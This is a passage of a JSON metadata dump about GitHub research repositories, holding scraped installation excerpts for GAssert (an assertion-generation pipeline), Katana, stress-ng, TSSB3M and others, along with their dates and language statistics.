EvoSuite 1.0.6\n\t* Going to generate test cases for class: examples.SimpleMethods\n\t* Starting client\n\t* Connecting to master process on port 9922\n\t* Analyzing classpath: \n\n\nYou should find the initial Evosuite tests in `subjects\\simple-examples_getMin\\evosuite-initial-tests`\n\n\nThen you will see a series of gradle build failure/success. This is an expected behaviour because the script will run the generated tests on the mutants to collect the sets of incorrect states. Since the mutations might lead to failures, seeing build failures is normal.\n\n\n\t* Try:\n\tRun with --stacktrace option to get the stack trace. Run with --info or --debug option to get more log output.\n\tBUILD FAILED in 1s\n\t3 actionable tasks: 3 executed\n\tfailing tests in file\n\t[examples.SimpleMethodsInit_1_ESTest.test01, examples.SimpleMethodsInit_1_ESTest.test02, \texamples.SimpleMethodsInit_1_ESTest.test03]\n\t:compileJava\n\t:processResources NO-SOURCE\n\t:classes\n\t:compileTestJava\n\t:processTestResources NO-SOURCE\n\t:testClasses\n\t:test\n\tResults: SUCCESS (3 tests, 3 successes, 0 failures, 0 skipped)\n\nAfter [DAIKON](https://plse.cs.washington.edu/daikon/) will generate an invariant for the method under test. You can find the invariant in the file `subjects\\simple-examples_getMin\\initial-assertions\\daikon.assertions`\n\n\tRUN DAIKON\n\tDaikon version 5.7.2, released November 7, 2018; http://plse.cs.washington.edu/daikon.\n\tReading declaration files Processing trace data; reading 1 dtrace file:\n\t============================================\n\texamples.RunAllTests.main(java.lang.String[]):::ENTER\n\targs != null\n\targs.getClass().getName() == java.lang.String[].class.getName()\n\t(\"oneOf.java.jpp: SEQUENCE unimplemented\" != null)\n\tdaikon.Quant.pairwiseEqual(daikon.Quant.collectObject(args, \"toString()\"), new String[] {  })\n\t=================================================\n\texamples.RunAllTests.main(java.lang.String[]):::EXIT\n\nThen Phase 1 terminates, the collected program states are stored on the disk inside the folder `initial-states` inside the subject folder.\n\n***\n### Phase 2 - Oracle improvement process\n\nNow the actual oracle improvement process will start. The time budget will be divided in 3 to allow for at least 2 iterations with the oracle assessor (see paper for the details).\n\nYou should see the following output at console:\n\n\ttime budget minutes single evo:  3\n\t START TOOL: GASSERT SEED: 0 BUDGET: 10  class: examples.SimpleMethods methodName: \n\t- Use Randoop to generate Tests for class: SimpleMethods.java seed: \n\nRandoop will start again to allow dynamic analysis which is needed for preparing the subject.\n\nThen, the evolutionary process will start by collecting the states and variables:\n\n\t2020-06-03 17:06:48,329 .<init>(EvolutionaryAlgorithm.java:56)     \n\t START GASSERT \n \n\t2020-06-03 17:06:48,429 .logInfo(TestExecutionStates.java:155)     \n\t number of tests |T|= ... \n\t \n\t2020-06-03 17:06:48,429 .logInfo(TestExecutionStates.java:156)     \n\t number of mutants |M|= ... \n\t \n\t2020-06-03 17:06:48,429 .logInfo(TestExecutionStates.java:159)     \n\t number of mutant tests |M||T|= .. \n\t \n\tsize correct states ... size incorrect states..\n\t2020-06-03 17:06:48,432 .load(VariableManager.java:60)     \n\t boolean variables that will be considered 0 [] \n\t \n\t2020-06-03 17:06:48,432 .load(VariableManager.java:61)     \n\t number variables that will be considered 5 [result, a, b, old_b, old_a] \n\t \n\t2020-06-03 17:06:48,433 .run(EvolutionaryAlgorithm.java:70)     \n\t start initialization population \n\t \n\tinitial assertions [result < a]\n\nThen you will see a summary for every 10 generations, showing the fittest solution. That is, the assertion with the lowest number of FP, FN, and lowest complexity. For example,\n\n\t# generation:              10\n\ttime cost:                 00:00:03.689\n\taverage time cost:         00:00:00.368\n\tAssertionManager cached assertions:          12659\n\tCPU load:                  3.7509765625\n\t# running threads:                  12\n\tMemory heap used:          408\n\tbest so far(((old_a > a) || (result <= old_b)) && ((result == (old_b * a)) || (result == old_a)))\n\t(((old_a > a) || (result <= old_b)) && ((result == (old_b * a)) || (result == old_a)))\n\tfitnessValueFP=0.0\n\tfitnessValueFN=0.09090909090909091\n\tcomplexity=17\n\ttype=BOOLEAN\n\tidsFNGOOD[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n\tidsFPGOOD[0, 1, 2, 3, 4, 5]\n\nThis assertion has zero false positive but has 0.090 false negatives.\n\nIf GASSERT finds an assertion with zero FP and zero FN and it has executed for at least 100 generations, it will stop.\n\nThen it will start the iteration 1 and invoke the oracle assessor [OASIs](https://github.com/guneljahan/OASIs) for collecting evidence of false positives and false negatives\n\n\n\t============ ITERATION ========== 1\n\t...\n\trunning OASIS - FALSE NEGATIVE\n\t...\n\tFN? true\n\t...\n\trunning OASIS - FALSE POSITIVE\n\t...\n\tFP? true\n\nIf it finds evidence it will run again GASSERT to improve the assertion returned by the previous iteration. Now inside the `states` there will be the new correct and incorrect states produced by OASIs that will help GASSERT to converge to a better assertion.\n\nThis iterative process continues until the time budget expires or the oracle assessor OASIs cannot find any evidence of FP and FN.\n\nFor example, this can be the final assertion\n\n\tassert((((result == old_b) || (old_a == result)) && ((result <= old_a) && (result <= old_b)))); \n\n> Note that old_b refer to the values and the method entry, while b refers to the value at the assertion point\n> \n> \n\nPhase 2 is terminated. The outputted assertion will be saved inside `subjects\\simple-examples_getMin\\output\\output.assertions`. More information of the run can also be found in the folder `subjects\\simple-examples_getMin\\output\\`.\n\n***\n#### Phase 3 - evaluation of the resulting assertion\n\nThe final phase evaluates the final assertion with the mutation tool [PIT](https://pitest.org/) using the evaluation tests generated by Randoop during PHASE 1.\n\nYou should see PIT running\n\n\t================================================================================\n\t- Mutators\n\t================================================================================\n\t> org.pitest.mutationtest.engine.gregor.mutators.RemoveConditionalMutator_ORDER_ELSE\n\t>> Generated 3 Killed 1 (33%)\n\t> KILLED 1 SURVIVED 2 TIMED_OUT 0 NON_VIABLE 0 \n\t> MEMORY_ERROR 0 NOT_STARTED 0 STARTED 0 RUN_ERROR 0 \n\t> NO_COVERAGE 0 \n\t--------------------------------------------------------------------------------\n\t> org.pitest.mutationtest.engine.gregor.mutators.RemoveConditionalMutator_EQUAL_ELSE\n\t>> Generated 2 Killed 0 (0%)\n\t> KILLED 0 SURVIVED 2 TIMED_OUT 0 NON_VIABLE 0 \n\t> MEMORY_ERROR 0 NOT_STARTED 0 STARTED 0 RUN_ERROR 0 \n\t> NO_COVERAGE 0 \n\t--------------------------------------------------------------------------------\n\n\nat the end you will see the mutation score of the final assertion\n\n\ttotal mutation 4 killed mutation 3 ratio .75000000000000000000\n\tassert((((old_a >= b) || (old_a == result)) && ((old_b > old_a) || (result == old_b))));\n\nYou can see information about the mutations killed/survived inside the `subjects/simple-examples_getMin/build/reports/pitest`.\n\n\nPhase 3 is terminated. You can see more information about the result and the GASSERT run inside the `output` folder.\n\n\n## Run with the other subjects\n\nThere are a total of 34 subjects that we used in our experiment. This is the complete list\n\n\tAngle_diff  \n\tAngle_getTurn  \n\tArithmeticUtils_subAndCheck  \n\tAscii_equalsIgnoreCase  \n\tBooleanUtils_compare  \n\tBooleanUtils_toBoolean  \n\tComplex_reciprocal  \n\tConversion_hexDigitMsb0ToInt  \n\tConversion_hexToShort  \n\tEnvelope_maxExtent  \n\tFastMathNew_floor  \n\tIntMath_mod  \n\tLinearLocation_compareLocationValues  \n\tLongMath_saturatedMultiply  \n\tMathUtil_clamp  \n\tMathUtilsNew_copySignInt  \n\tQueueAr_dequeueAll  \n\tQueueAr_dequeue  \n\tQueueAr_enqueue  \n\tQueueAr_getFront  \n\tQueueAr_makeEmpty  \n\tStackAr_makeEmpty  \n\tStackAr_pop  \n\tStackAr_push  \n\tStackAr_topAndPop  \n\tStackAr_top  \n\tStringUtils_stripToNull  \n\tUnsignedInts_saturatedCast  \n\tUtf8_encodedLength  \n\tVector2D_crossProduct   \n\tsimple-examples_abs  \n\tsimple-examples_addElementToSet  \n\tsimple-examples_getMin  \n\tsimple-examples_incrementNumberAtIndex  \n\nFor example, if you want to run subject `BooleanUtils_compare`, using RANDOM approach and initial assertion the invariant generated by daikon, 90 minutes time budget you can run as follows\n\n\nFor example:\n\n\tcd GAssert/scripts\n\t./run_gassert.sh RANDOM BooleanUtils_compare 90 daikon.assertions\n\t\n## Prepare a new subject\n\nYou can prepare a new subject by following these instructions:\n\n1. create a folder and put inside the folder `subjects`\n2. be sure that it contains all the needed folders, to do so you can follow the provided template in `subjects/subjectName_methodName.zip`\n3. be sure that the name of the folder subject contains the method name after the underscore. For example, if the method under analysis is called `foo`, the subject folder must be called `subjectName_foo.zip`\n4. inside the subject folder must be the file `classname.input` with inside the fully qualified name of the class under test (e.g., `com.a.b.ClassA`).\n5. Inside the subject folder there must be a folder called `orig` which contain the source code of the class under test with the assertion point specified by an `assert(true);` statement. \n6. The assertion in input must be specified in a separate file located in the folder `input-assertions`\n7. If the initial assertion is in this form `assert(A && B && C);` please write the inner expression first one by one per line, and the second last line the entire assertion followed by an empty line. For example, if your assertion is `assert( (a>b) && (b!=0));` the file should contain the following:\n\t\n\t\n\t\tassert(a>b);  \n\t\tassert(b!=0);  \n\t\tassert((a>b) && (b!=0));  \n\t\n\n8. GAssert needs gradle to compile the subject. Please follow the provided template. You can add your own dependencies. Be sure that PIT is properly configured with the right package name (targetClasses)\n\n\t\tpitest {\n\t\t    targetClasses = ['examples.*']  \n\t\t    threads = 1\n\t\t    outputFormats = ['XML', 'HTML']\n\t\t    jvmArgs = ['-ea']\n\t\t    timestampedReports = false\n\t\t    mutators = [\"ALL\"]\n\t\t}\n\t\n\t\n\t\n\n\n\n\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/valerio-terragni/gassert/main/INSTALL.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\nTo reproduce the evaluation results you must first follow the installation instructions described in the file [INSTALL.md](INSTALL.md) \nAfter that, you can run the evaluation as follows: go to the main folder of GAssert artifact, then from the command line perform the following commands.\n```\n\tcd scripts\n\t./run_evaluation.sh\n```\n \n",
                    "original_header": "How to reproduce the evaluation results"
                },
                "confidence": 0.98682239453205,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/valerio-terragni/gassert/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-11-15T21:34:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-18T14:43:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "666": {
        "filename": "saltlab_Katana_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/saltlab/Katana",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "**Abstract**: Contextual information plays a vital role for software developers when understanding and fixing a bug. Context can also be important in deep learning-based program repair to provide extra information about the bug and its fix. Existing techniques, however, treat context in an arbitrary manner, by extracting code in close proximity of the buggy statement within the enclosing file, class, or method, without any analysis to find actual relations with the bug. To reduce noise, they use a predefined maximum limit on the number of tokens to be used as context. We present a program slicing-based approach, in which instead of arbitrarily including code as context, we analyze statements that have a control or data dependency on the buggy statement. We propose a novel concept called dual slicing, which leverages the context of both buggy and fixed versions of the code to capture relevant repair ingredients. We present our technique and tool called Katana, the first to apply slicing-based context for a program repair task. The results show Katana effectively preserves sufficient information for a model to choose contextual information while reducing noise. We compare against four recent state-of-the-art context-aware program repair techniques. Our results show Katana fixes between 1.5 to 3.7 times more bugs than existing techniques.\n",
                    "type": "Text_excerpt",
                    "original_header": "Katana: Dual Slicing-Based Context for Learning Bug Fixes"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/saltlab/Katana/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Use the scripts in bug-miner for collecting one line diff data from github.\n \n",
                    "original_header": "Data collection"
                },
                "confidence": 0.9149210904549225,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/saltlab/Katana/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-08-09T06:55:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-19T01:50:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 275404
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 43622
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Cuda",
                    "name": "Cuda",
                    "type": "Programming_language",
                    "size": 28049
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 16058
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 6633
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 825
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 477
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 443
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "667": {
        "filename": "mlatcl_fbp-vs-soa_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mlatcl/fbp-vs-soa",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-02-15T07:52:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-04T16:54:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1695811
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 387391
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 8862
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "668": {
        "filename": "ErwindeGelder_ScenarioDomainModel_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ErwindeGelder/ScenarioDomainModel",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The domain model from this repository can be installed as a Python package and quickly reused in other projects. Go to the package directory and type in a console:\n\n```sh\npip3 install .\n```\n\nTo import the package in another project, use the standard importing mechanisms:\n\n```python\nimport domain_model\n# Or\nfrom domain_model import Actor\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installing the package"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ErwindeGelder/ScenarioDomainModel/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-10-11T07:49:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-31T11:04:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 413880
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 137807
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "669": {
        "filename": "ColinIanKing_stress-ng_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ColinIanKing/stress-ng",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The [Ubuntu stress-ng reference guide](https://wiki.ubuntu.com/Kernel/Reference/stress-ng)\ncontains a brief overview and worked examples.\n",
                    "type": "Text_excerpt",
                    "original_header": "Quick Start Reference Guide",
                    "parent_header": [
                        "stress-ng (stress next generation)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ColinIanKing/stress-ng/master/README.Android"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<a href=\"https://repology.org/project/stress-ng/versions\">\n    <img src=\"https://repology.org/badge/vertical-allrepos/stress-ng.svg\" alt=\"Packaging status\" align=\"right\">\n</a> \n  * 350+ stress tests\n  * 80+ CPU specific stress tests that exercise floating point, integer,\n    bit manipulation and control flow\n  * 20+ virtual memory stress tests\n  * 40+ file system stress tests\n  * 30+ memory/CPU cache stress tests\n  * portable: builds on Linux (Debian, Devuan, RHEL, Fedora, Centos, Slackware\n    OpenSUSE, Ubuntu, etc..), Solaris, FreeBSD, NetBSD, OpenBSD, DragonFlyBSD,\n    Minix, Android, MacOS X, Serenity OS, GNU/Hurd, Haiku, Windows Subsystem\n    for Linux, Cygwin and SunOs/Dilos/Solaris.\n    with gcc, musl-gcc, clang, icc, icx, tcc and pcc.\n  * tested on alpha, armel, armhf, arm64, hppa, i386, loong64, m68k, mips32, mips64,\n    power32, ppc64el, risc-v, sh4, s390x, sparc64, x86-64 \n",
                    "original_header": "stress-ng (stress next generation)"
                },
                "confidence": 0.9991103772859324,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ColinIanKing/stress-ng/master/README.Android"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "https://github.com/ColinIanKing/stress-ng/tarball/version \nhttps://github.com/ColinIanKing/stress-ng/tarball/V0.13.05\n \n",
                    "original_header": "Tarballs"
                },
                "confidence": 0.9999315469409893,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ColinIanKing/stress-ng/master/README.Android"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Recent versions of stress-ng are available in the Ubuntu stress-ng ppa for various\nUbuntu releases: \nhttps://launchpad.net/~colin-king/+archive/ubuntu/stress-ng\n```\nsudo add-apt-repository ppa:colin-king/stress-ng\nsudo apt update\nsudo apt install stress-ng\n```\n \n",
                    "original_header": "Debian packages for Ubuntu"
                },
                "confidence": 0.9999375671493156,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ColinIanKing/stress-ng/master/README.Android"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To build, the following libraries will ensure a fully functional stress-ng\nbuild: (note libattr is not required for more recent disto releases). \nDebian, Ubuntu: \n  * gcc g++ libacl1-dev libaio-dev libapparmor-dev libatomic1 libattr1-dev libbsd-dev libcap-dev libeigen3-dev libgbm-dev libcrypt-dev libglvnd-dev libipsec-mb-dev libjpeg-dev libjudy-dev libkeyutils-dev libkmod-dev libmd-dev libmpfr-dev libsctp-dev libxxhash-dev zlib1g-dev \nRHEL, Fedora, Centos (static builds): \n  * gcc g++ eigen3-devel glibc-static Judy-devel keyutils-libs-devel libacl-devel libaio-devel libatomic-static libattr-devel libbsd-devel libcap-devel libgbm-devel libcrypt-devel libglvnd-core-devel libglvnd-devel libjpeg-devel libmd-devel libX11-devel libXau-devel libxcb-devel lksctp-tools-devel mpfr-devel xorg-x11-proto-devel xxhash-devel zlib-devel \nSUSE:\n  * gcc gcc-c++ eigen3-devel keyutils-devel libaio-devel libapparmor-devel libatomic1 libattr-devel libbsd-devel libcap-devel libgbm-devel libglvnd-devel libjpeg-turbo libkmod-devel libmd-devel libseccomp-devel lksctp-tools-devel mpfr-devel xxhash-devel zlib-devel \nAlpine Linux:\n  * build-base eigen-dev jpeg-dev judy-dev keyutils-dev kmod-dev libacl-dev libaio-dev libatomic libattr libbsd-dev libcap-dev libmd-dev libseccomp-dev lksctp-tools-dev mesa-dev mpfr-dev xxhash-dev zlib-dev \nNOTE: the build will try to detect build dependencies and will build an image\nwith functionality disabled if the support libraries are not installed. \nAt build-time stress-ng will detect kernel features that are available on the\ntarget build system and enable stress tests appropriately. Stress-ng has been\nbuild-tested on Ubuntu, Debian, Debian GNU/Hurd, Slackware, RHEL, SLES, Centos,\nkFreeBSD, OpenBSD, NetBSD, FreeBSD, Debian kFreeBSD, DragonFly BSD, OS X, Minix,\nSolaris 11.3, OpenIndiana and Hiaku. Ports to other POSIX/UNIX like operating\nsystems should be relatively easy. \nNOTE: ALWAYS run ```make clean``` after fetching changes from the git repository\nto force the build to regenerate the build configuration file. Parallel builds using\nmake -j are supported. \nTo build on BSD systems, one requires gcc and GNU make:\n```\n        CC=gcc gmake clean\n\tCC=gcc gmake\n``` \nTo build on OS X systems, just use:\n```\n\tmake clean\n\tmake -j\n``` \nTo build on MINIX, gmake and clang are required:\n```\n\tCC=clang gmake clean\n\tCC=clang gmake\n``` \nTo build on SunOS, one requires GCC and GNU make, build using:\n```\n\tCC=gcc gmake clean\n\tCC=gcc gmake\n``` \nTo build on Dilos, one requires GCC and GNU make, build using:\n```\n\tCC=gcc gmake clean\n\tCC=gcc gmake\n``` \nTo build on Haiku R1/beta5:\n```\n\t# GCC\n\tmake clean\n\tmake\n\t# Clang\n\tCC=clang make clean\n\tCC=clang make\n``` \nTo build a static image (example, for Android), use:\n```\n\t# path to Android NDK\n\texport NDK=$HOME/android-ndk-r27-beta2\n\texport PATH=$PATH:$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin\n\texport TARGET=aarch64-linux-android\n\t# Define Android API level\n\texport API=27\n\texport CC=$TARGET$API-clang\n\n\tmake clean\n\tSTATIC=1 make\n``` \nTo build with full warnings enabled:\n```\n\tmake clean\n\tPEDANTIC=1 make\n``` \nTo build with the Tiny C compiler:\n```\n\tmake clean\n\tCC=tcc make\n``` \nTo build  with the PCC portable C compiler use:\n```\n\tmake clean\n\tCC=pcc make\n``` \nTo build with the musl C library:\n```\n\tmake clean\n\tCC=musl-gcc\n``` \nTo build with the Intel C compiler icc use:\n```\n\tmake clean\n\tCC=icc make\n``` \nTo build with the Intel C compiler icx use:\n```\n\tmake clean\n\tCC=icx make\n``` \nTo perform a cross-compilation using gcc, use a static build, specify\nthe toolchain (both CC and CXX). For example, a mips64 cross build:\n```\n\tmake clean\n\tSTATIC=1 CC=mips64-linux-gnuabi64-gcc CXX=mips64-linux-gnuabi64-g++ make -j $(nproc)\n```\nTo perform a cross-compile for qnx, for example, a aarch64 qnx cross build:\n```\n    make clean\n    CC=aarch64-unknown-nto-qnx7.1.0-gcc CXX=aarch64-unknown-nto-qnx7.1.0-g++ STATIC=1 make\n```\n \nTo build with debug (-g) enabled use:\n```\n\tmake clean\n\tDEBUG=1 make\n```\n \n",
                    "original_header": "Building stress-ng"
                },
                "confidence": 0.9912811014759251,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ColinIanKing/stress-ng/master/README.Android"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2015-06-05T12:05:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T21:55:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 6333558
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 323026
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 24093
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 20826
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 7758
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1029
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "670": {
        "filename": "cedricrupb_TSSB3M_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/cedricrupb/TSSB3M",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**Commit details:**\n- **project:** Name of the git project where the commit occurred.\n- **project_url:** URL of project containing the commit\n- **commit_sha:** commit SHA of the code change\n- **parent_sha:** commit SHA of the parent commit\n- **file_path:** File path of the changed source file\n- **diff:** Universal diff describing the change made during the commit\n- **before:** Python statement before commit\n- **after:** Python statement after commit (addresses the same line) \n",
                    "original_header": "JSON fields"
                },
                "confidence": 0.9868712144195667,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/cedricrupb/TSSB3M/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`run_batch_crawler.py`: A script to mine a batch of Git repositories. The crawler will sequentially checkout each repository and then search the Git history for single line edits\n```bash\n$ python run_batch_crawler.py [--compress] [index_file] [output_dir]\n```\nThe index file should be file with a list of Git repository urls. Output dir is the directory where mining results are saved to. Optionally, the script can save results into compressed files to save disk space. \n",
                    "original_header": "Mining Process"
                },
                "confidence": 0.9999807300955177,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/cedricrupb/TSSB3M/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-12-14T08:02:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-19T13:29:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 45734
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "671": {
        "filename": "michaeldorner_tax_se_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/michaeldorner/tax_se",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-04-06T08:03:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-24T18:58:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 9630
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 7817
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "672": {
        "filename": "zkx06111_ALGO_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/zkx06111/ALGO",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-05-19T18:34:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-24T02:14:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 6328
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "673": {
        "filename": "utwente-fmt_ProB-LTSmin-iFM16_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/utwente-fmt/ProB-LTSmin-iFM16",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "In order to clone this repository you will require `git` to be set up and installed on your machine. If you experience any issues please also consult the [LTSmin] website for further instructions.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Symbolic Reachability Analysis of B through ProB and LTSmin"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/utwente-fmt/ProB-LTSmin-iFM16/master/README.md"
            },
            {
                "result": {
